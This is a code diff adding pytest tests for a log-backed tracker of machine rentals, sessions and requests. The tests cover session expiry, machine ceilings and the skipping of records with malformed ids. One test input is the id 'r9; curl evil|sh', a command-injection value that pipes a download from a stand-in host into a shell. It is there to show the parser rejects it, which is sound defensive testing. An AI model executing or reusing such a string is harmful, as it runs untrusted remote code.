@@ -178,3 +178,62 @@ def test_ids_never_collide_with_a_hand_written_one(tmp_path):
     with open(path, "a", encoding="utf-8") as handle:
         handle.write(json.dumps({"kind": "machine", "id": "m7", "state": "requested", "at": T0.isoformat()}) + "\n")
     assert r.add_machine("s1", "vast", label_of).id == "m8"
+
+
+def test_a_request_is_recorded_with_its_kind_and_project_and_answered_by_kind(tmp_path):
+    r = rig(tmp_path)
+    asked = r.ask("main session 3", "night frames", project="/work/twosuns")
+    image = r.ask("main session 3", "another image", kind="image", project="/work/twosuns", image="ghcr.io/me/x:1")
+    assert (asked.id, asked.kind, asked.state, asked.project) == ("r1", "machine", j.ASKED, "/work/twosuns")
+    assert (image.kind, image.image) == ("image", "ghcr.io/me/x:1")
+    assert [q.id for q in r.answer_requests("session s1 opened", kind="machine")] == ["r1"]
+    assert r.requests()["r2"].state == j.ASKED
+    assert [q.id for q in r.answer_requests("allowed", ids=["r2"])] == ["r2"]
+
+
+def test_a_machine_needs_an_open_unexpired_session_inside_the_transaction(tmp_path):
+    clock = Clock()
+    r = rig(tmp_path, clock)
+    r.open_session("max", "x", hours=1, budget=1.0)
+    r.set_session("s1", j.CLOSING, reason="closed by the person")
+    with pytest.raises(j.RigError, match="not open"):
+        r.add_machine("s1", "vast", label_of)
+    r.open_session("max", "y", hours=1, budget=1.0)
+    clock.forward(minutes=61)
+    with pytest.raises(j.RigError, match="ended"):
+        r.add_machine("s2", "vast", label_of)
+
+
+def test_the_machine_ceiling_holds_inside_the_transaction(tmp_path):
+    r = rig(tmp_path)
+    r.open_session("max", "x", hours=1, budget=1.0)
+    r.add_machine("s1", "vast", label_of, limit=1)
+    with pytest.raises(j.RigError, match="ceiling"):
+        r.add_machine("s1", "vast", label_of, limit=1)
+    r.move("m1", j.DRAINING)
+    r.move("m1", j.GONE)
+    assert r.add_machine("s1", "vast", label_of, limit=1).id == "m2"
+
+
+def test_a_machine_carries_its_address_and_when_it_was_requested(tmp_path):
+    r = rig(tmp_path)
+    r.open_session("max", "x", hours=1, budget=1.0)
+    machine = r.add_machine("s1", "vast", label_of)
+    assert machine.requested == iso(T0)
+    r.move("m1", j.PROVISIONING, instance="7")
+    r.move("m1", j.READY, address="ssh4.vast.ai:30123")
+    assert r.machines()["m1"].address == "ssh4.vast.ai:30123"
+
+
+@pytest.mark.parametrize("kind, bad", [("request", "r9; curl evil|sh"), ("request", "r9\n"), ("request", "m9"),
+                                       ("machine", "m1 x"), ("session", "r1")])
+def test_a_record_whose_id_flotilla_never_issues_is_skipped(tmp_path, kind, bad):
+    import json
+    store = LocalLogStore(tmp_path / "rig")
+    record = {"kind": kind, "id": bad, "state": {"request": "asked", "machine": "ready", "session": "open"}[kind],
+              "at": "2026-10-07T20:00:00+00:00"}
+    (tmp_path / "rig").mkdir(exist_ok=True)
+    with open(tmp_path / "rig" / "rig.jsonl", "a", encoding="utf-8") as out:
+        out.write(json.dumps(record) + "\n")
+    rig = j.Rig(store)
+    assert not rig.requests() and not rig.machines() and not rig.sessions()
